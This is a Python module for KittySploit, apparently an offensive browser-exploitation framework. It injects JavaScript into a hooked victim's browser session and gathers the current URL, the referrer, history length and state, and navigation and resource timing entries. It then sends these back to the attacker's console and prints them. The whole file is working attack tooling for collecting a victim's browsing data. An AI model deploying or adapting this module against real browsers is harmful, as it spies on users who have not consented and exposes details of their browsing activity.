from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "History Dump",
		"description": "Collect navigation history signals available to JavaScript (Performance API, referrer, history.length)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	max_resources = OptInteger(100, "Maximum resource timing entries to include", False)

	def run(self):
		max_resources_val = int(self.max_resources or 100)

		code_js = f"""
		(function() {{
			const MAX_RESOURCES = {max_resources_val};
			const out = {{
				current_url: window.location.href,
				referrer: document.referrer || '',
				history_length: (window.history && history.length) ? history.length : 0,
				history_state: null,
				navigation: null,
				resources: [],
				limitations: [
					'Modern browsers do not expose full cross-origin history URLs to JavaScript',
					'history.length only reveals the session history stack depth',
					'Performance/resource entries may reveal recently loaded URLs on this origin'
				]
			}};

			try {{
				out.history_state = history.state;
			}} catch (e) {{
				out.history_state_error = e.message || String(e);
			}}

			try {{
				const nav = performance.getEntriesByType('navigation');
				if (nav && nav.length > 0) {{
					const n = nav[0];
					out.navigation = {{
						type: n.type,
						redirectCount: n.redirectCount,
						duration: n.duration,
						domContentLoaded: n.domContentLoadedEventEnd,
						loadEventEnd: n.loadEventEnd,
						transferSize: n.transferSize,
						nextHopProtocol: n.nextHopProtocol || ''
					}};
				}}
			}} catch (e) {{
				out.navigation_error = e.message || String(e);
			}}

			try {{
				const resources = performance.getEntriesByType('resource') || [];
				out.resources = resources.slice(0, MAX_RESOURCES).map(function(r) {{
					return {{
						name: r.name,
						initiatorType: r.initiatorType,
						duration: r.duration,
						transferSize: r.transferSize || 0
					}};
				}});
				out.resource_total = resources.length;
				out.resources_truncated = resources.length > MAX_RESOURCES;
			}} catch (e) {{
				out.resources_error = e.message || String(e);
			}}

			return JSON.stringify(out);
		}})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=10.0)
		if not result:
			print_error("Failed to retrieve history signals")
			return False

		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse history dump response: {exc}")
			print_debug(f"Raw response: {result}")
			return False

		print_info("=" * 80)
		print_info("Navigation / history signals")
		print_info("=" * 80)
		print_info(f"  Current URL: {data.get('current_url', '')}")
		if data.get("referrer"):
			print_info(f"  Referrer: {data['referrer']}")
		print_info(f"  history.length: {data.get('history_length', 0)}")

		nav = data.get("navigation")
		if nav:
			print_info(f"  Navigation type: {nav.get('type', '?')} (redirects: {nav.get('redirectCount', 0)})")

		resources = data.get("resources") or []
		resource_total = data.get("resource_total", len(resources))
		if resources:
			print_info(f"  Resource timing entries: {resource_total}")
			for entry in resources[:15]:
				name = entry.get("name", "")
				if len(name) > 100:
					name = name[:100] + "..."
				print_info(f"    [{entry.get('initiatorType', '?')}] {name}")
			if resource_total > 15:
				print_info(f"    ... {resource_total - 15} more resource(s)")

		print_info("-" * 80)
		for note in data.get("limitations", []):
			print_warning(f"  {note}")

		print_info("=" * 80)
		print_status("Full history dump (JSON):")
		print_info(json.dumps(data, indent=2, ensure_ascii=False))
		print_success("History dump complete")
		return True
